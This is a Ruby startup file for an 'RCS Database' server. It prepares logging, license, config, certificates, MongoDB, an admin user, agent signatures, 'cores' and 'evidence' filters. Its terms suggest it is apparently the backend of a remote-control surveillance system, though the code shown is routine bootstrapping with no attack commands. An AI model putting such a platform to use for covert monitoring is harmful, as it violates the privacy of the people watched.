#
#  The main file of the db
#

# relatives
require_relative 'events'
require_relative 'config'
require_relative 'core'
require_relative 'license'
require_relative 'tasks'
require_relative 'offload_manager'
require_relative 'statistics'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class Application
  include RCS::Tracer
  extend RCS::Tracer

  def self.trace_setup
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml'
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end

    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    Dir::mkdir(Dir.pwd + '/log/err') if not File.directory?(Dir.pwd + '/log/err')

    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
  end

  # the main of the collector
  def run(options)

    # initialize random number generator
    srand(Time.now.to_i)

    begin
      build = File.read(Dir.pwd + '/config/VERSION_BUILD')
      version = File.read(Dir.pwd + '/config/VERSION')
      trace :fatal, "Starting the RCS Database #{version} (#{build})..."

      # ensure the temp directory is empty
      FileUtils.rm_rf(Config.instance.temp)

      # check the integrity of the code
      HeartBeat.dont_steal_rcs

      # load the license limits
      return 1 unless LicenseManager.instance.load_license

      # config file parsing
      return 1 unless Config.instance.load_from_file

      # we need the certs
      return 1 unless Config.instance.check_certs

      # ensure that the CN is resolved to 127.0.0.1 in the /etc/host file
      # this is to avoid IPv6 resolution under windows 2008
      DB.instance.ensure_cn_resolution

      # connect to MongoDB
      until DB.instance.connect
        trace :warn, "Cannot connect to MongoDB, retrying..."
        sleep 5
      end

      # ensure the temp dir is present
      Dir::mkdir(Config.instance.temp) if not File.directory?(Config.instance.temp)

      # make sure the backup dir is present
      FileUtils.mkdir_p(Config.instance.global['BACKUP_DIR']) if not File.directory?(Config.instance.global['BACKUP_DIR'])

      # ensure the sharding is enabled
      DB.instance.enable_sharding

      # ensure mongo users for authentication
      DB.instance.ensure_mongo_auth

      # ensure all indexes are in place
      DB.instance.create_indexes

      Audit.log :actor => '<system>', :action => 'startup', :desc => "System started"

      # enable shard on audit log, it will increase its size forever and ever
      DB.instance.shard_audit

      # ensure at least one user (admin) is active
      DB.instance.ensure_admin

      # ensure we have the signatures for the agents
      DB.instance.ensure_signatures

      # load cores in the /cores dir
      DB.instance.load_cores

      # create the default filters
      DB.instance.create_evidence_filters

      # perform any pending operation in the journal
      OffloadManager.instance.recover

      # enter the main loop (hopefully will never exit from it)
      Events.new.setup Config.instance.global['LISTENING_PORT']
      
    rescue Interrupt
      trace :info, "System shutdown. Bye bye!"
      Audit.log :actor => '<system>', :action => 'shutdown', :desc => "System shutdown"
      return 0
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.message
      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end

  # we instantiate here an object and run it
  def self.run!(*argv)
    self.trace_setup
    return Application.new.run(argv)
  end

end # Application::
end #DB::
end #RCS::
